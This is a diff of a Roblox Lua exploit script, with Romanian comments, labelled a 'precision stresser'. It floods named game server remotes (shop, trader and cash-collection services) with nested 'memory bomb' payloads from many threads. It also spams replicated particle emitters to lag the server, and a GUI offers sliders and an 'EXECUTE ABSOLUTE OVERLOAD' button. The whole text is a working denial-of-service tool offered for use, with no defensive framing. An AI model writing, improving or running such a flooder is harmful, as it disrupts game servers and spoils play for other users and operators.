@@ -1,103 +1,133 @@
--- GONZO V28: PRECISION STRESSER (ANTI-KICK CALIBRATION)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
 
--- 1. TARGETS DIN SCANARE (Filtrăm EventService)
-local targets = {}
-for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-    if v:IsA("RemoteEvent") and not v:GetFullName():find("EventService") then
-        table.insert(targets, v)
+-- --- TARGETE CRITICE ---
+local net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+local targets = {
+    net:FindFirstChild("RF/ValentinesShopService/SearchUser"),
+    net:FindFirstChild("RF/RodsShopService/RequestBuy"),
+    net:FindFirstChild("RF/BrainrotTraderService/Fetch"),
+    net:FindFirstChild("RE/PlotService/CashCollected"),
+    ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true)
+}
+
+-- --- GENERATOR DE BOMBĂ DE MEMORIE (NUCLEAR L10) ---
+local function getAbsolutePayload()
+    local root = {}
+    for i = 1, 30 do -- 30 de rădăcini masive
+        local layer = root
+        for depth = 1, 10 do -- 10 NIVELURI DE ADÂNCIME
+            layer["L" .. depth] = { ["Data"] = string.rep("💣", 100), ["TS"] = tick() }
+            layer = layer["L" .. depth]
+        end
     end
+    return root
 end
 
--- 2. PAYLOAD STABIL
-local payload = {tick(), "STRESS_TEST"}
+-- --- INTERFAȚĂ GUI ---
+local ScreenGui = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 340, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -170, 0.2, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+MainFrame.BorderSizePixel = 2
+MainFrame.Active, MainFrame.Draggable = true, true
 
--- --- UI MOV NEON V28 ---
-local sg = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
-sg.Name = "Gonzo_V28_Calibrator"
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Text = "GONZO ABSOLUTE V12"
+Title.TextColor3 = Color3.new(1, 0, 0)
+Title.BackgroundColor3 = Color3.new(0, 0, 0)
+Title.Font = Enum.Font.GothamBlack
 
-local main = Instance.new("Frame", sg)
-main.Size = UDim2.new(0, 320, 0, 380)
-main.Position = UDim2.new(0.1, 0, 0.3, 0)
-main.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
-
-local stroke = Instance.new("UIStroke", main)
-stroke.Color = Color3.fromRGB(180, 0, 255)
-stroke.Thickness = 4
-
-local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1, 0, 0, 50)
-title.Text = "GONZO V28: LIMIT FINDER"
-title.TextColor3 = Color3.fromRGB(200, 100, 255)
-title.BackgroundColor3 = Color3.fromRGB(20, 0, 40)
-title.Font = Enum.Font.GothamBlack
-title.TextSize = 18
-
--- --- SLIDER DE INTENSITATE (0 - 1000) ---
-local function CreateSlider(name, pos, maxVal)
-    local frame = Instance.new("Frame", main)
-    frame.Size = UDim2.new(0.85, 0, 0, 45)
-    frame.Position = pos
-    frame.BackgroundTransparency = 1
-    local label = Instance.new("TextLabel", frame)
-    label.Size = UDim2.new(1, 0, 0, 25)
-    label.Text = name .. ": 0"
-    label.TextColor3 = Color3.new(1, 1, 1)
-    label.Font = Enum.Font.GothamBold
-    label.BackgroundTransparency = 1
-    local bar = Instance.new("Frame", frame)
-    bar.Size = UDim2.new(1, 0, 0, 6)
-    bar.Position = UDim2.new(0, 0, 0.7, 0)
-    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    local knob = Instance.new("TextButton", bar)
-    knob.Size = UDim2.new(0, 16, 0, 16)
-    knob.Position = UDim2.new(0, -8, 0.5, -8)
-    knob.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
-    knob.Text = ""
-    local val = 0
-    knob.MouseButton1Down:Connect(function()
-        local move = UserInputService.InputChanged:Connect(function(input)
-            if input.UserInputType == Enum.UserInputType.MouseMovement then
-                local p = math.clamp((input.Position.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
-                knob.Position = UDim2.new(p, -8, 0.5, -8)
-                val = math.floor(p * maxVal)
-                label.Text = name .. ": " .. val
-            end
-        end)
-        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
+-- --- HELPER SLIDER ---
+local function CreateSlider(name, pos, minVal, maxVal, default)
+    local Label = Instance.new("TextLabel", MainFrame)
+    Label.Size = UDim2.new(1, 0, 0, 25)
+    Label.Position = pos
+    Label.Text = name .. ": " .. default
+    Label.TextColor3 = Color3.new(1, 1, 1)
+    Label.BackgroundTransparency = 1
+    local Bar = Instance.new("Frame", MainFrame)
+    Bar.Size = UDim2.new(0.8, 0, 0, 4)
+    Bar.Position = pos + UDim2.new(0.1, 0, 0, 25)
+    Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    local Knob = Instance.new("TextButton", Bar)
+    Knob.Size = UDim2.new(0, 16, 0, 16)
+    Knob.Position = UDim2.new((default-minVal)/(maxVal-minVal), -8, 0.5, -8)
+    Knob.BackgroundColor3 = Color3.new(1, 0, 0)
+    Knob.Text = ""
+    local val = default
+    local dragging = false
+    Knob.MouseButton1Down:Connect(function() dragging = true end)
+    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local p = math.clamp((input.Position.X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
+            Knob.Position = UDim2.new(p, -8, 0.5, -8)
+            val = minVal + (p * (maxVal - minVal))
+            Label.Text = name .. ": " .. string.format("%.1f", val)
+        end
     end)
     return function() return val end
 end
 
-local GetIntensity = CreateSlider("PACKETS PER FRAME", UDim2.new(0.075, 0, 0.25, 0), 50)
+local GetIntensity = CreateSlider("INTENSITY (WAVES)", UDim2.new(0, 0, 0.15, 0), 1, 100, 20)
+local GetPackets = CreateSlider("PACKETS PER REMOTE", UDim2.new(0, 0, 0.3, 0), 1, 100, 30)
+local GetPhysics = CreateSlider("PHYSICS GLITCH", UDim2.new(0, 0, 0.45, 0), 0, 200, 0)
 
-local btn = Instance.new("TextButton", main)
-btn.Size = UDim2.new(0.85, 0, 0, 60)
-btn.Position = UDim2.new(0.075, 0, 0.65, 0)
-btn.Text = "START CALIBRATION"
-btn.BackgroundColor3 = Color3.fromRGB(40, 0, 80)
-btn.TextColor3 = Color3.new(1, 1, 1)
-btn.Font = Enum.Font.GothamBlack
+local ActionBtn = Instance.new("TextButton", MainFrame)
+ActionBtn.Size = UDim2.new(0.8, 0, 0, 60)
+ActionBtn.Position = UDim2.new(0.1, 0, 0.65, 0)
+ActionBtn.Text = "EXECUTE ABSOLUTE OVERLOAD"
+ActionBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
+ActionBtn.TextColor3 = Color3.new(1, 1, 1)
 
--- --- MOTOR DE EXECUȚIE ---
-local active = false
-btn.MouseButton1Click:Connect(function()
-    active = not active
-    btn.Text = active and "TESTING LIMITS..." or "START CALIBRATION"
-    btn.BackgroundColor3 = active and Color3.fromRGB(160, 32, 240) or Color3.fromRGB(40, 0, 80)
-end)
-
-RunService.Heartbeat:Connect(function()
-    if active and #targets > 0 then
-        local amount = GetIntensity() -- Câte pachete trimitem la fiecare frame
-        for i = 1, amount do
-            local remote = targets[math.random(1, #targets)]
-            pcall(function()
-                remote:FireServer(payload)
-            end)
-        end
+-- --- MOTORUL DE ANNIHILARE ---
+local isActive = false
+ActionBtn.MouseButton1Click:Connect(function()
+    isActive = not isActive
+    ActionBtn.Text = isActive and "OVERLOADING..." or "EXECUTE ABSOLUTE OVERLOAD"
+    ActionBtn.BackgroundColor3 = isActive and Color3.new(1, 0, 0) or Color3.fromRGB(80, 0, 0)
+    
+    if isActive then
+        -- 1. NETWORK SHREDDER (MULTITHREADED)
+        task.spawn(function()
+            while isActive do
+                local payload = getAbsolutePayload()
+                for _, r in pairs(targets) do
+                    if r then
+                        for wave = 1, GetIntensity() do
+                            task.spawn(function()
+                                for i = 1, GetPackets() do
+                                    pcall(function()
+                                        if r:IsA("RemoteEvent") then r:FireServer(payload) else r:InvokeServer(payload) end
+                                    end)
+                                end
+                            end)
+                        end
+                    end
+                end
+                task.wait(0.1) -- Rotație ultra-rapidă
+            end
+        end)
+        
+        -- 2. PHYSICS & REPLICATION GLITCH (FPS + SERVER LAG)
+        task.spawn(function()
+            while isActive do
+                local stress = GetPhysics()
+                if stress > 0 then
+                    for i = 1, stress do
+                        task.defer(function()
+                            local p = Instance.new("ParticleEmitter", Players.LocalPlayer.Character.PrimaryPart)
+                            p.Enabled = false -- Nu consumă GPU-ul tău, dar serverul trebuie să îl replice
+                            task.delay(0.1, function() p:Destroy() end)
+                        end)
+                    end
+                end
+                task.wait(0.05)
+            end
+        end)
     end
 end)
